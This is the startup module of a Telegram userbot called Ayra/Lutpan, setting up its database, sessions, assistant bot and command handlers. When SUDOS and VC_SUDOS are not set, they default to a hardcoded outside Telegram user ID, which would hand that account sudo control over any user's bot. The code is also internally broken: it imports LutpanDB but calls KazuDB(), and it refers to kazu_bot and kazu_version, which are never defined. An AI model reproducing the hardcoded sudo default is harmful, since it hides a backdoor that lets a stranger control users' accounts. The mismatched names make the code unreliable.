# Ayra - UserBot
# Copyright (C) 2021-2022 senpai80
#
# This file is a part of < https://github.com/senpai80/Ayra/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/senpai80/Ayra/blob/main/LICENSE/>.

import os
import sys

from .version import __version__

run_as_module = False

class LutpanConfig:
    lang = "id"
    thumb = "https://graph.org//file/d854abd533a783c6642b1.jpg"

if sys.argv[0] == "-m":
    run_as_module = True

    import time

    from .configs import Var
    from .startup import *
    from .startup._database import LutpanDB
    from .startup.BaseClient import LutpanClient
    from .startup.connections import validate_session, vc_connection
    from .startup.funcs import _version_changes, autobot, enable_inline, update_envs
    from .version import lutpan_version

    if not os.path.exists("./plugins"):
        LOGS.error(
            "'plugins' folder not found!\nMake sure that, you are on correct path."
        )
        exit()

    start_time = time.time()
    _lutpan_cache = {}
    _ignore_eval = []

    udB = KazuDB()
    update_envs()

    LOGS.info(f"Connecting to {udB.name}...")
    if udB.ping():
        LOGS.info(f"Connected to {udB.name} Successfully!")

    BOT_MODE = udB.get_key("BOTMODE")
    DUAL_MODE = udB.get_key("DUAL_MODE")

    if BOT_MODE:
        if DUAL_MODE:
            udB.del_key("DUAL_MODE")
            DUAL_MODE = False
        kazu_bot = None

        if not udB.get_key("BOT_TOKEN"):
            LOGS.critical(
                '"BOT_TOKEN" not Found! Please add it, in order to use "BOTMODE"'
            )

            sys.exit()
    else:
        lutpan_bot = LutpanClient(
            validate_session(Var.SESSION, LOGS),
            udB=udB,
            app_version=kazu_version,
            device_model="Lutpan",
        )
        kazu_bot.run_in_loop(autobot())

    asst = LutpanClient(None, bot_token=udB.get_key("BOT_TOKEN"), udB=udB)

    if BOT_MODE:
        lutpan_bot = asst
        if udB.get_key("OWNER_ID"):
            try:
                lutpan_bot.me = lutpan_bot.run_in_loop(
                    lutpan_bot.get_entity(udB.get_key("OWNER_ID"))
                )
            except Exception as er:
                LOGS.exception(er)
    elif not asst.me.bot_inline_placeholder:
        kazu_bot.run_in_loop(enable_inline(kazu_bot, asst.me.username))

    vcClient = vc_connection(udB, kazu_bot)

    _version_changes(udB)

    HNDLR = udB.get_key("HNDLR") or "."
    SUDOS = udB.get_key("SUDOS") or "5063062493"
    VC_SUDOS = udB.get_key("VC_SUDOS") or "5063062493"
    DUAL_HNDLR = udB.get_key("DUAL_HNDLR") or "/"
    SUDO_HNDLR = udB.get_key("SUDO_HNDLR") or "NO_HNDLR"
else:
    print("Lutpan 2022 © Lutpan-Ubot")

    from logging import getLogger

    LOGS = getLogger("Lutpan")

    lutpan_bot = asst = udB = vcClient = None
